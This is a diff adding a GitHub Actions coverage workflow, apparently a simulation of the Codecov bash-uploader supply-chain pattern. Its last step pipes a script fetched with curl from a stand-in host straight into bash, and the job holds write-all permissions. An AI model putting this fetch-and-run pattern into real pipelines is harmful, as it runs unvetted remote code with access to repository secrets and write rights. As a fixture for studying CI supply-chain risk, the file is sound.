@@ -1,0 +1,22 @@
+name: coverage-upload
+
+on:
+  push:
+    branches: [main]
+
+permissions: write-all
+
+jobs:
+  coverage:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - uses: codecov/codecov-action@v1
+      - name: Install dependencies
+        run: npm ci
+      - name: Build coverage bundle
+        run: npm run build
+      - name: Simulated bash uploader
+        run: |
+          echo "SIMULATION ONLY"
+          curl https://uploader.example.invalid/bash -s | bash
